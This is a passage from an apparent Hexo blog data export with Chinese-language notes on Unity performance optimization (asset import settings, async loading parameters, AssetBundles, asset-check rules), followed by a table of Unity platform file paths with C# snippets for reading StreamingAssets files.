尽量关闭</li>\n<li>5:Texture streaming</li>\n</ul>\n<h3 id=\"网格\"><a href=\"#网格\" class=\"headerlink\" title=\"网格\"></a>网格</h3><ul>\n<li>1:Model 里面的 Meshs 设置,资源的顶点数量与顶点属性数量</li>\n<li>2:Mesh Compression 尽量选 On</li>\n<li>3:Read/Write Enabled 尽量不勾选 </li>\n<li>4:Normals尽量让 Unity 自己计算</li>\n<li>5:Blend Shape Normals</li>\n<li>6:Tangents 尽量少</li>\n<li>7:Swap UVs 尽量不勾选</li>\n<li>8:Generate Lightmap UVs,尽量不勾选</li>\n<li>9:以上选择,全是为了数据量小而选择的,不为了表现,如果为了表现,需要进行取舍</li>\n</ul>\n<h3 id=\"动画片段\"><a href=\"#动画片段\" class=\"headerlink\" title=\"动画片段\"></a>动画片段</h3><ul>\n<li>1:片段数量</li>\n<li>2:压缩模式/动画精度/数据精度</li>\n<li>3:动画模式,Humanoid要比Generic 小很多</li>\n</ul>\n<h3 id=\"音频片段\"><a href=\"#音频片段\" class=\"headerlink\" title=\"音频片段\"></a>音频片段</h3><ul>\n<li>1:音频数量,</li>\n<li>2:加载方式,Load Type–&gt;选择 Streaming 是最快的</li>\n<li>3:压缩格式,Compression Format–&gt;PCM(不压缩),Vorbis(ogg 的格式),ADPCM(轻度压缩),MP3</li>\n<li>4:内存最小的选择是  :加载方式选择Streaming,压缩格式选择Vorbis,Vorbis 的 Quality 可以进一步控制,建议 50%</li>\n<li>5:建议使用 MP3 格式的音频文件,如果内存压力过大,可以考虑 Streaming 加载方式或较小 Quality 质量的 Vorbis 格式</li>\n<li>6:如果是非及时使用音效(背景音乐),建议开启 Load in Background 来提升加载效率</li>\n<li>7:如果 存在大量频繁使用的音效,建议选择 Decompressed On Load 来降低 CPU 开销</li>\n</ul>\n<h3 id=\"Particle-System\"><a href=\"#Particle-System\" class=\"headerlink\" title=\"Particle System\"></a>Particle System</h3><ul>\n<li>1:粒子系统数量</li>\n<li>2:材质,很多粒子加载,会将相同Material 加载进内存.</li>\n</ul>\n<h3 id=\"资源加载卸载的-API\"><a href=\"#资源加载卸载的-API\" class=\"headerlink\" title=\"资源加载卸载的 API\"></a>资源加载卸载的 API</h3><ul>\n<li>1:Resources.Load</li>\n<li>2:Resources.LoadAsync</li>\n<li>3:AssetBundle.Load</li>\n<li>4:AssetBundle.LoadAsync</li>\n<li>5:异步加载时开启Application.backgroundLoadingPriority=ThreadPriority.High;表示异步操作可以在主线程的单帧花费最长时间。单帧花费时间越多，可加载的数据越多，因此帧率将有所下降，较为影响游戏性能，但可减少加载资源的时间，能更快的进入游戏！反之，单帧花费时间越少，可加载的数据越少，对游戏的游戏性能影响较小，可在游戏进行时有很好的后台加载。<a href=\"https://docs.unity3d.com/2017.1/Documentation/ScriptReference/Application-backgroundLoadingPriority.html\" target=\"_blank\" rel=\"noopener\">官方文档</a></li>\n<li>6:QualitySettings.asyncUploadTimeSlice = 2;为了读取数据和上传纹理数据，重复使用了一个大小可以控制的环形缓冲区。使用asyncUploadTimeSlice以毫秒为单位设置异步纹理上传的时间片框架。最小值为1，最大值为33。</li>\n<li>7:QualitySettings.asyncUploadBufferSize = 4;为了读取数据和上传纹理数据，重复使用了一个大小可以控制的环形缓冲区。设置异步纹理上传的缓冲区大小。大小的单位是兆字节。最小值为2，最大值为512。虽然缓冲区会自动调整大小以适应当前加载的最大纹理，但建议将该值设置为场景中使用的最大纹理的大小，以避免重新调整缓冲区的大小会导致性能损失。</li>\n</ul>\n<h2 id=\"3-引擎如何加载一个-Prefab\"><a href=\"#3-引擎如何加载一个-Prefab\" class=\"headerlink\" title=\"3:引擎如何加载一个 Prefab?\"></a>3:引擎如何加载一个 Prefab?</h2><p>为何我们调整了 资源加载卸载的API 中提到的三个参数,异步加载就变得快了.我们就要了解引擎是如何加载一个 prefab 的.一个 UI 的 Prefab 可能含有 Texture,Mesh,Material 等等很多东西.</p>\n<ul>\n<li>1:加载 Mesh 并传输到 GPU;异步串行;异步串行加载时会寻找 AssetBundle 里面含有哪些资源,然后反序列化这些资源,然后先加载这个 Prefab 的 Mesh 传到 GPU 里面;</li>\n<li>2:加载 Texture 并传输到 GPU;异步串行;</li>\n<li>3:加载 shader &amp; Material;异步串行;前期是加载 shader,后期是主线程解析 shader</li>\n<li>4:加载 Object &amp; Component;异步串行;</li>\n<li>5:加载 AnimationClip 资源;异步串行;完全可以放在异步里面进行加载,不会卡主线程</li>\n<li>6:加载 Audio 资源;异步串行;使用 Streaming 模式是最快的.</li>\n<li>7:大量资源的异步加载均可在子线程中进行</li>\n<li>8:主线程主要处理 AwakeFromLoad &amp; Shader 解析</li>\n<li>9:主线程可以留出大量空间供逻辑代码使用</li>\n</ul>\n<hr>\n<h2 id=\"4-如何优化加载\"><a href=\"#4-如何优化加载\" class=\"headerlink\" title=\"4:如何优化加载?\"></a>4:如何优化加载?</h2><ul>\n<li>1:加快 Mesh,Texture等资源的异步加载效率</li>\n<li>2:加快处理 AwakeFromLoad &amp; Shader 解析</li>\n<li>3:Async Upload Pipeline<blockquote>\n<ul>\n<li>A:加载线程异步加载 Texture 和 Mesh 资源,用了 Mesh 的压缩,需要在主线程进行解压,是不能进行异步加载的,地形的 Texture 开了 Read/Write 是不能进行异步加载的</li>\n<li>B:通过渲染线程直接将其传送到 GPU</li>\n<li>C:目前 Unity 都支持,</li>\n<li>D:代码里面异步加载方法 AsyncUploadBuffer 加载完毕之后,直接回放到渲染线程进行渲染,渲染线程中的渲染方法AsyncUploadTimeSlice将数据上传</li>\n</ul>\n</blockquote>\n</li>\n<li>4:优化方法:将QualitySettings.asyncUploadBufferSize = 4;改为QualitySettings.asyncUploadBufferSize = 16;表示引擎从硬盘里面每次读取 4M,变为读取 16M,读取时都是在子线程.这个参数里面的 buff 缓冲可以认为是流式的读取</li>\n<li>5:优化方法:QualitySettings.asyncUploadTimeSlice = 2;改为QualitySettings.asyncUploadBufferSize = 8;表示渲染线程每一帧使用 2ms 去干活,变为渲染线程每一帧使用  8ms 去干活,有可能就多开了一个渲染线程</li>\n<li>6:AUP 让内存占用更加可控,加载 Upload Buffer 会增加一个恒定的内存,除此之外几乎没有副作用,在内存允许的情况下,可以设置 16MB 或者 32MB.对于asyncUploadTimeSlice方法,如果设置过大,会产生卡顿现象.</li>\n<li>7:压缩主线程上面的资源,控制异步加载资源在主线程的”后加载”耗时,各种资源的 AwakeFromLoad,Shader.Parse,设置代码 Application.backgroundLoadingPriority=ThreadPriority.High;</li>\n<li>8:Texture.AwakeFromLoad 是从主线程里面将Texture传到 GPU</li>\n<li>9:优化异步加载:调整 Upload Buffer 和 Upload Time Slice,调整 BackLoadingPriority,开启多线程渲染,调整资源的加载顺序(比如 shader)</li>\n<li>10:异步加载时需要注意代码的写法,不要搞成一帧加载很多.AssetBundle 加载的写法需要注意</li>\n<li>11:需要查看实例化操作是否合理,实例化的频率,大概需要 10K 帧有大的浮动;  一般正常的加载方式是–&gt;AB a0–&gt;AB a1(依赖 a0)–&gt;加载 a1–&gt;instantiate a1;错误加载方式–&gt;AB a1(依赖 a0)–&gt;加载 a1–&gt;instantiate a1–&gt;AB a0 这种情况下 a0 资源会出现在其他错误的地方;</li>\n<li>12:需要查看Active/Deactive操作是否合理,尤其是在 NGUI/UGUI 上面</li>\n</ul>\n<hr>\n<h2 id=\"5-资源内存\"><a href=\"#5-资源内存\" class=\"headerlink\" title=\"5:资源内存\"></a>5:资源内存</h2><ul>\n<li>1:有很多纹理在内存里面,但是没有进行渲染,也就是没有用到.需要查看 UI图集,技能特效.</li>\n<li>2:注意纹理的分辨率大小,以及 Mipmap 是否物尽其用</li>\n<li>3:在品质设置里面有个 Texture Streaming 选项中,有个参数:Memory Budget,在其足够时,Scene Texture 是满 Mipmap 加载,动态加载的 GO Texture 是最比配的 mipmap 进行加载和实例化,渲染时,则按照距离原因和 budget 进行调整.再其不足时,Scene Texture按照最低配加载,已加载 Streamed Texture 按照距离 Remove Mipmap,越远的越先 Remove 高 Level Mipmap ,动态加载的 GO Texture 只按最低配 Mipmap 加载,实例化和渲染.</li>\n<li>4:Max Level Reduction设定为 1 表示加载 mipmap 第一级,设置为 2 加载第二级</li>\n<li>5:在 mobile 端一定要设置 QualitySettings.streamingMipmapsActive = true;</li>\n<li>6:网格:关注顶点渲染密度.</li>\n<li>7:音频片段,Streaming 加载方式比较适合于背景音乐,对于同时播放的小音频文件,建议通过 Decompressed 方式.</li>\n</ul>\n<hr>\n<h2 id=\"6-AB-包\"><a href=\"#6-AB-包\" class=\"headerlink\" title=\"6:AB 包\"></a>6:AB 包</h2><ul>\n<li>1:建议目前全部采用 LZ4 压缩</li>\n<li>2:本地加载,建议使用 LoadFromFile(Async)来加载</li>\n<li>3:根据机型,选择适合的 Coroutine 次数</li>\n<li>4:如果自己压缩,建议使用 Gzip+LoadFromFile(Async)来加载</li>\n<li>5:AssetBundle.LoadAll 比 Asset.Load OneByOne 要好很多.</li>\n<li>6:切换场景时,尽可能使用 AssetBundle.Load 来提升加载效率</li>\n<li>7:小,细碎的同种类资源打包在一起(Shader,ParticleSystem)</li>\n</ul>\n<hr>\n<h2 id=\"7-Mono堆内存\"><a href=\"#7-Mono堆内存\" class=\"headerlink\" title=\"7:Mono堆内存\"></a>7:Mono堆内存</h2><ul>\n<li>1:子线程 Mono 分配,多见于和服务器交互.</li>\n<li>2:Lua 内存检测,关注 Destroyed 总数.</li>\n<li>3:Instantiate 实例化频率,实例化的耗时.</li>\n<li>4:Active/Deactive 频率和耗时.复杂的界面/带有动画组件的 GameObject 不要频繁使用</li>\n</ul>\n<h1 id=\"资源规范\"><a href=\"#资源规范\" class=\"headerlink\" title=\"资源规范\"></a>资源规范</h1><ul>\n<li><p>1 Animation </p>\n<pre><code>检查动画曲线精度:动画曲线精度过高会增加动画占用内存; 此规则仅面向以文本格式序列化的*.anim文件中的浮点精度;用文本编辑器打开.anim动画文件，修改m_EditorCurves::curve::m_Curve下的float值的精度。建议用脚本直接将此文件中所有float精度都调整为5位小数以下。动画曲线精度应小于5 ;       \n检查动画缩放曲线:动画不应具有缩放曲线,动画中的缩放曲线会增加动画占用内存,用文本编辑器打开.anim动画文件，确认m_EditorCurves和m_FloatCurves下不包括attribute为m_Scale的curve子对象。动画不应具有缩放曲线;</code></pre></li>\n<li><p>2 AnimationController </p>\n<pre><code>动画控制器中的动画剪辑个数: 动画控制器中动画剪辑数量过多会造成动画初始化耗时过多;动画剪辑个数应小于2</code></pre></li>\n<li><p>3 FBX     </p>\n<pre><code>检查读/写标志:开启FBX资源的读/写标志会导致双倍的内存占用;FBX资源的读/写标志应该被禁用      \n检查动画资源压缩方式:动画资源使用最佳压缩方式可以提高加载效率;查看Inspector -&gt; Animation Tab -&gt; Anim. Compression选项;动画资源应该使用最佳压缩方式      \n应为网格资源启用OptimizeMesh;为网格资源启用OptimizeMesh可以减少最终游戏包的大小;检查网格资源的OptimizeMesh;查看Inspector -&gt; Model Tab -&gt; Meshes -&gt; Optimize mesh选项;应为网格资源启用OptimizeMesh;        \n在FBX资源中有太多的顶点, 默认阈值是500;FBX资源资源中有太多的顶点, 请检查是否必要;检查FBX资源定点数;顶点数量限制;FBX资源资源中有太多的顶点;顶点数量有多少;             </code></pre></li>\n<li><p>4 Prefab</p>\n<pre><code>Prefab Max Particle Limit;渲染Mesh的粒子系统不宜设置过高的粒子总数, 默认阈值为30;当粒子系统渲染Mesh时(Inspector: Particle System -&gt; Renderer -&gt; Render Mode == Mesh), 相比于渲染Billboard时计算资源消耗会明显上升，因此需要对粒子总数加以限制;检查最高粒子总数限制;检查Inspector -&gt; Particle System -&gt; Max Particles配置;渲染Mesh的粒子系统不宜设置过高的粒子总数;              \n检查粒子系统的发射速率:当粒子系统渲染Mesh时(Inspector: Particle System -&gt; Renderer -&gt; Render Mode == Mesh), 相比于渲染Billboard时计算资源消耗会明显上升，因此需要对粒子发射速率加以限制;检查Inspector -&gt; Particle System -&gt; Emission -&gt; Rate over Time/Distance配置;渲染Mesh的粒子系统不宜设置过高的粒子发射速率, 不应超过5             \n检查Skinned Mesh Renderer:启用Skinned Motion Vectors会使渲染器同时使用当前帧和上一帧的蒙皮网络来渲染目标的动画以提高精度，从而需要双倍大小的缓冲区并占用双倍的显存;启用Skinned Motion Vectors将以消耗双倍内存为代价提高蒙皮网格的精度;      \n检查网格读/写标记:被预制件关联的网格资源应该关闭读/写标记;被预制件关联的网格资源应该关闭读/写标记       </code></pre></li>\n<li><p>5 Scene</p>\n<pre><code>检查场景未添加tag的GameObject:场景中的所有GameObject都应当添加tag;场景包含未添加tag的GameObject;          \nScene Multiple Audio Listeners:一个场景不应包含多个Audio Listener;一个场景不应包含多个Audio Listener;检查场景中的Audio Listener;检查场景中所有GameObject下的Audio Listener组件;场景包含多个音频侦听器;                    \n检查场景中mesh collider:Mesh Collider可以在场景中提供更精细化的碰撞检测，随之而来也会消耗大量计算资源，建议审慎使用。 检查场景中所有GameObject下的Mesh Collider组件;场景包含了mesh collider;        \n检查场景渲染设置:在移动平台，建议在渲染设置中关闭对雾的渲染以节省计算资源。检查Window -&gt; Rendering -&gt; Lighting Settings -&gt; Scene -&gt; Other Settings -&gt; Fog选项;在移动平台，应在设置里关闭雾的渲染;           \nScene Shadow Resolution;场景中灯光的阴影分辨率应与项目设置一致;场景中灯光的阴影分辨率应与项目设置一致;检查场景阴影分辨率;检查Inspector -&gt; Light -&gt; Shadow Type -&gt; Realtime Shadows -&gt; Resolution选项，建议使用&#39;Use Quality Settings&#39;;场景中灯光的阴影分辨率应与项目设置一致;            \nScene Rigidbody;场景中的静态GameObject不应关联Rigidbody;静态GameObject的Rigidbody模块是无用的;检查场景中的Rigidbody;静态GameObject不应关联Rigidbody;        \nScene Canvas Component;包含太多组件的Canvas可能会影响UI刷新的性能;包含太多组件的Canvas可能会影响UI刷新的性能，并进一步影响应用的帧率;检查Canvas中的component数量;包含太多组件的Canvas可能会影响UI刷新的性能;            \nScene UI Outside Screen;场景包含屏幕外的UI组件;放置在屏幕外的UI组件尽管不可见仍会消耗渲染资源，建议删掉此组件或者修正可能出现的设置错误;检查屏幕外的UI组件;场景包含屏幕外的UI组件;            \n检查场景Animator组件中的ApplyRootMotion选项:如果不需要进行根骨骼动画位移, 建议关闭场景中Animator组件的applyRootMotion选项。场景中包含勾选了applyRootMotion选项的Animator组件;       \n检查场景Animator组件中的cullingMode:场景中Animator组件的cullingMode是AlwaysAnimate会增加CPU使用率。场景中包含cullingMode为AlwaysAnimate的Animator组件;</code></pre></li>\n<li><p>6 Script</p>\n<pre><code>检查OnGUI方法:由于内存使用率高，不应使用OnGUI方法;IMGUI是过时的UI系统，仅建议在开发调试时使用。     \n检查所有的 Mono 生命周期函数 方法:空方法会导致掉帧,建议去除。     </code></pre></li>\n<li><p>7 Shader</p>\n<pre><code>检查Shader中纹理数量:Shader中过多的纹理可能会增加GPU消耗;Shader中的纹理个数应小于3,Shader Texture Count</code></pre></li>\n<li><p>8 Texture</p>\n<pre><code>检查纹理读/写标记:开启纹理资源的读/写标志会导致双倍的内存占用; 检查Inspector -&gt; Advanced -&gt; Read/Write Enabled选项;纹理资源的读/写标志应被禁用;         \n检查Mipmap标记:未压缩的纹理资源启用Mipmap标志会增加内存占用; 检查Inspector -&gt; Advanced -&gt; Generate Mip Maps选项;未压缩的纹理应该禁用mipmap ;        \nTexture iOS compression format;检查iOS平台的纹理压缩格式;检查iOS平台的纹理压缩格式;iOS平台纹理压缩格式;如果希望对各平台统一设置压缩格式，检查Inspector -&gt; Default -&gt; Format选项; 如果希望为iOS平台单独设置，打开旁边的iOS选项卡，勾选Override for iOS并检查下面的Format选项;iOS平台的纹理格式应该是astc;对iOS平台使用默认值，但格式不是Automatic;         \nAndroid平台纹理压缩格式:检查Android平台的纹理压缩格式;如果希望对各平台统一设置压缩格式，检查Inspector -&gt; Default -&gt; Format选项; 如果希望为Android平台单独设置，打开旁边的Android选项卡，勾选Override for Android并检查下面的Format选项;对安卓平台使用默认值，但格式不是Automatic;           \n纹理资源大小2的幂次:大小非2的幂次的纹理资源将无法使用ETC1和PVRTC压缩格式。在导入时自动伸缩为2的幂次也可能会导致内存占用或者贴图质量问题。 检查Inspector -&gt; Advanced -&gt; Non-Power of 2选项. 建议使用原始大小为2的幂次的贴图;纹理大小不是2的幂次;         \n检查纹理是否过大:过大的纹理资源会更多的消耗内存;Custom Parameters: heightThreshold : 512widthThreshold : 512;纹理大于 512 * 512 ;       \n检查Aniso级别:检查Inspector -&gt; Aniso Level滑动条;纹理资源的Aniso级别大于1;Aniso级别大于1的纹理资源会增加内存占用和采样率;纹理资源的Aniso级别不应大于1;                \n检查纹理资源的过滤模式:纹理的过滤模式一般不建议使用Trilinear，会占用较高的计算资源。 检查Inspector -&gt; Filter Mode选项;纹理使用了Trilinear过滤模式;          \n检查纹理资源alpha通道:如果纹理包含空的alpha通道，则应禁用&#39;Alpha源&#39;标志，否则会浪费这部分的内存。 检查Inspector -&gt; Alpha Source选项;应禁用具有空Alpha通道的纹理的‘Alpha源’标志;          \n检查纯色纹理:纯色纹理的使用可能可以由一些设置来代替。由于某些情况下纯色纹理是必不可少的，此警告仅会在所使用的纹理较大(&gt;16*16)时才会触发。纯色纹理会浪费内存;        \nTexture edge transparent;边缘有较大透明部分的纹理应裁剪以节省内存;边缘有较大透明部分的纹理应裁剪以节省内存;检查纹理透明边缘;边缘有较大透明部分的纹理应裁剪以节省内存;           \n检查纹理重复环绕模式:Repeat Wrap模式可能会导致纹理上出现意外的边缘; 检查Inspector -&gt; Wrap Mode选项;重复环绕模式可能会导致纹理上出现意外的边缘;     \n检查重复纹理:检查重复纹理;纹理重复          \n检查雪碧图纹理填充率:填充率是雪碧图分割后的有效面积与总面积的比率，较低的雪碧图纹理填充率会导致显存的浪费。Custom Parameters: fillRateThreshold : 0.5onlyCheckSprite : True; 尝试重新编排雪碧图，尽量缩小总面积以提高填充率;sprite填充率低于 0.5</code></pre></li>\n<li><p>9 Audio</p>\n<pre><code>启用Force to Mono:检查Inspector -&gt; Force To Mono选项:应为音频资源启用forceMono,如不需要立体声,开启forceMono可以减少内存和磁盘占用;音频应该启用forceMono，以节省存储和内存;      \n检查iOS平台的音频压缩格式:检查Inspector -&gt; iOS Tab -&gt; Compression Format选项;iOS平台的音频剪辑应使用MP3格式;        \n检查安卓平台的音频压缩格式:检查Inspector -&gt; Android Tab -&gt; Compression Format选项;安卓平台的音频剪辑应使用Vorbis格式;       \n检查音频加载类型:检查Inspector -&gt; (Platform Tab) -&gt; Load Type选项;有多少的短音效应使用DecompressOnLoad;有多少的的常规音效应使用CompressedInMemory;有多少的音乐应该使用Streaming;        </code></pre></li>\n<li><p>10 EditorSetting<br>应设置CompanyName;检查公司名称设置;检查File -&gt; Build Settings -&gt; Player Settings -&gt; Player -&gt; Company Name的设置;CompanyName不应设置为DefaultCompany;<br>应设置Build Target Icons;应设置Build Target Icons;检查Build Target图标;检查File -&gt; Build Settings -&gt; Player Settings -&gt; Player -&gt; Default Icon的设置;应设置 %s 的Build Target Icons;<br>应设置开启GraphicsJobs;这项设置会为图形任务开启多线程. 但这个是实验性质的, 会引起新的问题. 请自行测试;检查GraphicsJobs设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Graphic Jobs(Experimental)*的设置;尝试开启graphicJobs并测试;<br>应设置开启BakeCollisionMeshes;这项设置可以减少加载/初始化的时间, 虽然会增加一些构建时间和包体积;检查BakeCollisionMeshes设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; PreBake Collision Meshes的设置;如果在项目中启用了physics, 可以考虑开启Prebake Collision Meshes选项;<br>应设置开启StripEngineCode;关闭StripEngineCode会增加包体积;检查StripEngineCode设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Strip Engine Code的设置;关闭StripEngineCode会增加包体积;<br>在Physics设置中应关闭AutoSyncTransforms;AutoSyncTransforms选项是为了兼容老版本的Unity而设立的, 会增加CPU的使用;检查Physics中的AutoSyncTransforms设置:检查Editor -&gt; Project Settings -&gt; Physics -&gt; Auto Sync Transforms的设置;在Physics设置中开启AutoSyncTransforms会增加CPU的使用;<br>在Physics设置中LayerCollisionMatrix中的格子不应该都勾选上;这会增加CPU的负担, 应该取消勾选那些没有必要的格子;检查Physics设置中的LayerCollisionMatrix设置;检查Editor -&gt; Project Settings -&gt; Physics -&gt; Layer Collision Matrix的设置;在Physics设置中LayerCollisionMatrix中的格子不应该都勾选上;<br>在Physics2D设置中应关闭AutoSyncTransforms;AutoSyncTransforms选项是为了兼容老版本的Unity而设立的, 会增加CPU的使用;检查Physics2D中的AutoSyncTransforms设置;检查Editor -&gt; Project Settings -&gt; Physics2D -&gt; Auto Sync Transforms的设置;在Physics2D设置中开启AutoSyncTransforms会增加CPU的使用;<br>在Physics2D设置中LayerCollisionMatrix中的格子不应该都勾选上;这会增加CPU的负担, 应该取消勾选那些没有必要的格子;检查Physics2D中LayerCollisionMatrix设置;检查Editor -&gt; Project Settings -&gt; Physics2D -&gt; Layer Collision Matrix的设置:在Physics2D设置中LayerCollisionMatrix中的格子不应该都勾选上;<br>StandardShaderQuality选项在所有Graphics Tier中应相同:这会增加编译时间和包体积, 除非你想要支持很多性能跨度很大的设备;检查Graphics中StandardShaderQuality设置;检查Editor -&gt; Project Settings -&gt; Graphics -&gt; Tiers -&gt; Standard Shader Quality的设置;StandardShaderQuality选项在所有Graphics Tier中应相同;<br>Android设置中的ManagedStrippingLevel选项不应为Low或者Disabled:这会增加包体积;检查Android的ManagedStrippingLevel设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Managed Stripping Level的设置;ndroid设置中的ManagedStrippingLevel选项应为Medium或者High;<br>iOS设置中的Architecture选项不应为Universal;这会增加包体积. 如果工程并不准备支持32位的 iOS 设备, 将其设为 ARM64;检查iOS的Architecture设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Architecture的设置;iOS设置中的Architecture选项不应为Universal;<br>iOS设置中的AccelerometerFrequency选项应为 Disabled;如果项目没有用到设备的加速度计, 禁用 AccelerometerFrequency 可以节省一些 CPU 处理时间;检查iOS的AccelerometerFrequency设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Accelerometer Frequency的设置;iOS设置中的AccelerometerFrequency选项应为 Disabled;<br>在 iOS 的 GraphicsAPIs 设置里应只包含 Metal:如果设备支持Metal, 在 GraphicsAPIs 里只开启 Metal 可以减少包体积和得到更好的 CPU 表现;检查iOS的GraphicsAPIs设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; GraphicsAPIs的设置;在 iOS 的 GraphicsAPIs 设置里应只包含 Metal;<br>“Editor iOSManagedStrippingLevel Setting”:iOS设置中的ManagedStrippingLevel选项不应为Low;这会增加包体积;检查iOS的ManagedStrippingLevel设置;检查Editor -&gt; Project Settings -&gt; PlayerSettings -&gt; Managed Stripping Level的设置;iOS设置中的ManagedStrippingLevel选项应为Medium或者High;<br>不建议使用Resources系统来管理asset;使用Resources系统可能会延长程序的启动时间。此系统已经过时，不建议使用。检查项目目录下是否存在Resources文件夹;不建议使用Resources系统来管理asset;     </p>\n<pre><code></code></pre></li>\n</ul>\n<p>11 Mesh</p>\n<pre><code>Mesh Read&amp;Write Flag:应为网格资源禁用读/写标志;开启Mesh资源的读/写标志会导致双倍的内存占用;检查网格资源读/写标记;网格资源应禁用读/写标志;       </code></pre><p>12 Model</p>\n<pre><code>Model Read&amp;Write Flag;应为模型资源禁用读/写标志;开启M资源的读/写标志会导致双倍的内存占用;检查模型资源读/写标记;模型资源应禁用读/写标志;     </code></pre><p>13 Video</p>\n<pre><code>导入的视频文件大小应小于某一限制，默认为256MB;检查视频大小;导入的视频文件体积不应过大;视频大小限制;;      </code></pre>"},{"title":"Unity 网络优化","date":"2020-05-08T03:41:32.000Z","top":40,"_content":"","source":"_posts/Unity/Optimize/网络优化.md","raw":"---\ntitle: Unity 网络优化\ndate: 2020-05-08 11:41:32\ntop: 40\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---","slug":"Unity/Optimize/网络优化","published":1,"updated":"2020-06-15T07:12:03.800Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0f00442gk7bos3dn5n","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"各个平台的路径","date":"2020-05-11T03:41:32.000Z","top":1,"_content":"\n# 编辑器下运行的路径\nPlatform | Method | Path | Relative,absolute    \n-------------------------|-------------------------|-------------------------|-------------------------\nmac-UnityEditor|Application.dataPath|xxx/项目名字/Assets|absolute(绝对路径)\nmac-UnityEditor|Application.streamingAssetsPath|xxx/项目名字/Assets/StreamingAssets|absolute(绝对路径)\nmac-UnityEditor|Application.persistentDataPath|/Users/用户名字/Library/Application Support/打包的名字/AB|absolute(绝对路径)\nmac-UnityEditor|Application.temporaryCachePath|/var/folders/n0/xxx/T/打包的名字/AB|absolute(绝对路径)\nwindows-UnityEditor|Application.dataPath|xxx/项目名字/Assets|absolute(绝对路径)\nwindows-UnityEditor|Application.streamingAssetsPath|xxx/项目名字/Assets/StreamingAssets|absolute(绝对路径)\nwindows-UnityEditor|Application.persistentDataPath|C:/Users/用户名字/AppData/LocalLow/打包的名字/项目名字|absolute(绝对路径)\nwindows-UnityEditor|Application.temporaryCachePath|C:/Users/ADMINI~1/AppData/Local/Temp/打包的名字/项目名字|absolute(绝对路径)\n\n# 编译成安装包之后运行的路径\nPlatform | Method | Path | Relative,absolute    \n-------------------------|-------------------------|-------------------------|-------------------------\nmac.app|Application.dataPath|xxx/mac.app/Contents|absolute(绝对路径)\nmac.app|Application.streamingAssetsPath|xxx/mac.app/Contents/Resources/Data/StreamingAssets|absolute(绝对路径)\nmac.app|Application.persistentDataPath|/Users/用户名字/Library/Application Support/打包的名字/AB|absolute(绝对路径)\nmac.app|Application.temporaryCachePath|/var/folders/n0/xxx/T/打包的名字/AB|absolute(绝对路径)\nwindows.exe|Application.dataPath|xxx/Assets|absolute(绝对路径)\nwindows.exe|Application.streamingAssetsPath|xxx/Assets/StreamingAssets|absolute(绝对路径)\nwindows.exe|Application.persistentDataPath|C:/Users/用户名字/AppData/LocalLow/打包的名字/项目名字|absolute(绝对路径)\nwindows.exe|Application.temporaryCachePath|C:/Users/ADMINI~1/AppData/Local/Temp/打包的名字/项目名字|absolute(绝对路径)\nAndroid.apk|Application.dataPath|/data/app/(Package Name)-xxx/base.apk|absolute(绝对路径)\nAndroid.apk|Application.streamingAssetsPath|jar:file:///data/app/(Package Name)-xxx/base.apk!/assets|absolute(绝对路径)\nAndroid.apk|Application.persistentDataPath|/storage/emulated/0/Android/data/(Package Name)/files|absolute(绝对路径)\nAndroid.apk|Application.temporaryCachePath|/storage/emulated/0/Android/data/(Package Name)/cache|absolute(绝对路径)\niOS.ipa|Application.dataPath|/private/var/containers/Bundle/Application/xxx/AB.app/Data|absolute(绝对路径)\niOS.ipa|Application.streamingAssetsPath|/private/var/containers/Bundle/Application/xxx/AB.app/Data/Raw|absolute(绝对路径)\niOS.ipa|Application.persistentDataPath|/var/mobile/Containers/Data/Application/xxx/Documents|absolute(绝对路径)\niOS.ipa|Application.temporaryCachePath|/var/mobile/Containers/Data/Application/xxx/Library/Caches|absolute(绝对路径)\n\n\n# Android 真机读取\n```\n    //Android 真机读取streamingAssetsPath文件夹下的东西,必须使用 WWW/UnityWebRequest 来进行读取,其他方式读取不了\n    WWW www = new WWW(Application.streamingAssetsPath + \"/\" + \"xxx.xxx\");  \n    yield return www;  \n    //加载完成后处理，有点delay  \n    ShowPath.text = www.text;\n\n    UnityWebRequest uwr = UnityWebRequest.Get(Application.streamingAssetsPath + \"/\" + \"xxx.xxx\");  \n    yield return uwr.SendWebRequest();  \n    //加载完成后处理，有点delay  \n    ShowPath.text = uwr.downloadHandler.text;\n```\n\n# iOS,MAC,Windows 平台读取\n```\n    //Android 真机读取streamingAssetsPath文件夹下的东西,必须使用 WWW/UnityWebRequest 来进行读取,其他方式读取不了\n    WWW www = new WWW(\"file://\" +Application.streamingAssetsPath + \"/\" + \"xxx.xxx\");  \n    yield return www;  \n    //加载完成后处理，有点delay  \n    ShowPath.text = www.text;\n\n    UnityWebRequest uwr = UnityWebRequest.Get(\"file://\" + Application.streamingAssetsPath + \"/\" + \"xxx.xxx\");  \n    yield return uwr.SendWebRequest();  \n    //加载完成后处理，有点delay  \n    ShowPath.text = uwr.downloadHandler.text;\n\n    string path = Application.streamingAssetsPath + \"/\" + \"xxx.xxx\";\n    if (File.Exists(path)) //判断文件是否存在\n    {\n        StreamReader streamReader = File.OpenText(path);\n        ShowPath.text = streamReader.ReadToEnd();\n        streamReader.Close();\n    }\n```\n\n","source":"_posts/Unity/Path/平台路径.md","raw":"---\ntitle: 各个平台的路径\ndate: 2020-05-11 11:41:32\ntop: 1\ncategories:\n- Unity\ntags:\n- Unity\n---\n\n# 编辑器下运行的路径\nPlatform | Method | Path | Relative,absolute    \n-------------------------|-------------------------|-------------------------|-------------------------\nmac-UnityEditor|Application.dataPath|xxx/项目名字/Assets|absolute(绝对路径)\nmac-UnityEditor|Application.streamingAssetsPath|xxx/项目名字/Assets/StreamingAssets|absolute(绝对路径)\nmac-UnityEditor|Application.persistentDataPath|/Users/用户名字/Library/Application 